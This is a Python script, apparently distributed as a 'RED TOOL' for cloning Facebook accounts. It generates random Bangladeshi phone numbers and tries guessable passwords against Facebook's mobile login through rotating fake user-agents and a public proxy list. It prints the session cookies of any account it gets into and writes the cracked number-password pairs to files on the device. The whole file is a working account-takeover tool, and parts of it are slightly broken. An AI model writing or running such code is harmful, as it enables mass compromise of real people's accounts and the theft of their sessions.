

import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    os.system('pkg install espeak')

RED = '\033[1;91m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' 

YELLOW = '\033[1;33m'

BLUE = '\033[1;34m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' 

M = '\x1b[1;91m' 

H = '\x1b[1;92m' 

K = '\x1b[1;93m' 

B = '\x1b[1;94m' 

U = '\x1b[1;95m' 

O = '\x1b[1;96m' 

N = '\x1b[0m'    

A = '\x1b[1;90m' 

BN = '\x1b[1;107m' 

BBL = '\x1b[1;106m' 

BP = '\x1b[1;105m' 

BB = '\x1b[1;104m' 

BK = '\x1b[1;103m' 

BH = '\x1b[1;102m' 

BM = '\x1b[1;101m' 

BA = '\x1b[1;100m' 

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text

 open('.prox.txt','w').write(prox)

except Exception as e:

 print('')

prox=open('.prox.txt','r').read().splitlines()

for xd in range(10000):

    aa='Mozilla/5.0 (Linux; U; Android 11;'

    b=random.choice(['6','7','8','9','10','11','12'])

    c='fr-fr; Redmi Note 11 Build/'

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Redmi Note 11 Build/RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn

#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36

    aa='Mozilla/5.0 (Linux; Android 13;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    

    aa='Mozilla/5.0 (Linux; Android 10;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

    aa='Mozilla/5.0 (Linux; Android 12;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	

	

    aa='Mozilla/5.0 (Linux; Android 11;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    

    aa='Mozilla/5.0 (Linux; Android 9;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 10 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/107.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

os.system('xdg-open https://t.me/+626cHxTq2f9iYzdl')



logo = ("""

\033[1;91m██████╗███████ ██████╗     
\033[1;32m██╔══██╗██╔════╝██╔══██╗    
\033[1;91m██████╔╝█████╗ ██║  ██║    
\033[1;32m██╔══██╗██╔══╝  ██║  ██║    
\033[1;91m██║  ██║███████╗██████╔╝    
\033[1;91m╚═╝  ╚═╝╚══════╝╚═════╝                                                            
                                                                      
        \x1b[37;41m\t WELLCOME TO RED TOOL\x1b[0;m\n\n\x1b[1;37m                          
\033[1;91m----------------------------------------------
\033[1;91mᴛᴏᴏʟ ɴᴀᴍᴇ ʀᴇᴅ
\033[1;32mꜰᴀᴄᴇʙᴏᴏᴋ ɪᴅ ᴄʟᴏɴᴇ
\033[1;32m15 ᴅᴇʏ 150 30ᴅᴀʏ 200
\033[1;32mᴠᴇʀꜱɪᴏɴ 14.0
\033[1;91m----------------------------------------------
""")                                              



class Main:

    def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        os.system("clear")

        print(logo)

        os.system('espeak -a 200 "WEELCAME , TO  , RED , TOOL"')

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═XXX═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        print(" [A] RENDOM[ᴀʟʟ ᴛɪᴍᴇ ꜰɪʀᴇ]")
    
        print(" [00] Exit")

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═XXX═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        Alif =input(" [?] Choose : ")

        os.system('xdg-open https://t.me/+626cHxTq2f9iYzdl')

        if Alif in ["1", "01"]:

            num()

        if Alif in [" 0", "00"]:

            exit()

        else:

            exit()

def num():

    user=[]

    os.system('clear')

    print(logo)

    print(' [+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')

    os.system('espeak -a 200 "Select your Number"')

    kode = input(' [?] Enter sim code: ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    os.system('clear')

    print(logo)

    print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')

    os.system('espeak -a 200 "select Crack Limit"')

    limit = int(input(' [?] Crack Your Limit : '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as noob:

        os.system('clear')

        print(logo)

        os.system('espeak -a 200 "Random , RED , RED , RED"')

        tl = str(len(user))

        print("\033[1;91m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        print(' \033[1;97m[+] Total Ids:\033[1;92m '+tl)

        print(' \033[1;92m[+] Process Has Been Started')

        print(' \033[1;92m[+] Wait For ids ')

        print(' \033[1;92m[+] Use Flight Mode For Speed Up ')

        print("\033[1;92m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        for guru in user:

            uid = kode+kodex+kod+guru

            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'i love you,Bangladesh']

            noob.submit(rcrack1,uid,pwx,tl)

    print(' [+] Crack process has been completed')

    print(' [+] Ids saved in RED.txt,cp.txt')



def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[\x1b[\033[1;91mCRACKING 🩸\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://m.alpha.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {'authority': 'free.facebook.com',
            'method': 'GET', 
            'scheme': 'https', 
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
            'sec-ch-ua-full-version-list': '"Google Chrome";v="113.0.5672.127", "Chromium";v="113.0.5672.127", "Not-A.Brand";v="24.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent':pro}
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            lo = session.post('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;34m[\033[\033[0;101mRED🍁\03[0m[\033[1;32mOK\033[1;34m]\033[1;32m'+uid+'\033[1;32m • \033[1;32m'+ps+'')
                os.system("play-audio m4.mp3")
                print('\r\033[0;101mCOOKIE \033[0m=''\033[1;32m'+coki+'\033[0m''\033[0m')
               # cek_apk(session,coki)
                open('/sdcard/RED-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid);cek_apk(coki)
                break
          #  elif 'checkpoint' in log_cookies:
              #  coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
          #      cid = coki[24:39]
             #   print('\r\r\33[1;34m MAHIN-CP ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/RED-cp👻.txt', 'a').write( uid+' | '+ps+' \n')
               # cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mGHOST-2F '+uid+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
    except:
        pass

Main()